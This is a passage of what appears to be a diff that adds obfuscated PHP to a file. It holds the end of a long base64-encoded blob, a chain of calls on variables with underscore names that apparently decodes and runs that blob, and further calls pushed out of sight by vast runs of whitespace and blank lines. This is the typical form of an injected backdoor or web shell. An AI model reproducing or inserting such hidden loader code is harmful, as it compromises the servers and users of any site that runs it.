udtz02dOZNLe2UGZ2qDxZ4lOgdr/uVehsIzj6Uz2ks9+ctiz13at/Ox8Gwlrz3YxWcsr9pm6r9n+Bo//+U+xvOmC+eAl/OnUxs506NbPpP89fnW5+vmbKxF9zyH7J6u5XTu0j4+v2O30AE4YsLOPCXI+23xkbiBN0+ffW4V+lOZLTc/9pLHebfQ/3Rs217Wb3Yen4FJ5tymfiOKp6z36GHO+tQ6/Cye/YzXeoVnh3onHJ6v6el6zVXmf3fPoFzn4X2QhedJiHtQf3ab9aQ61d07NbZLMe3w3Mhx/GT9KOXnNZZFf+PPlFAvDfKOK72+B9zP+kG5/i/1aDN5QmdcxuzZoax39NYeUgm8jPUjl2tlJ2cw5fNG2BVeYz303uGc8tpzrVXk0tNvwJSIr43XM9kz4bQWs3hO0Bfx/jM+TxwLvzuUk6zGdsieyS7X+C/3C2Y9R8TN7Kr5wP7OnCQ4qrmcnFFc6PvgZ9wp7712zn0hZ27OlaiYtyr8uUcWF7J9iqXak094Szic9gTz57KO9Gg/wT/EJXL9PYsxFjvvCl6sRsWbnNO1slZPcTJ+99yW4XX2XB5x7Ub0Qs95dZD7F86KT89gztfZeH+eF/Aa4pUevcml81ZvouV54v9tWWbfEQ8+ffj9hx/+/X/Z2if2/af0t3/+/i0fL3z2lg/+4zDhTx/o/x/+O5/2/m/a3f+892/alW3op5LRchP65+//AqTBP9c=';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
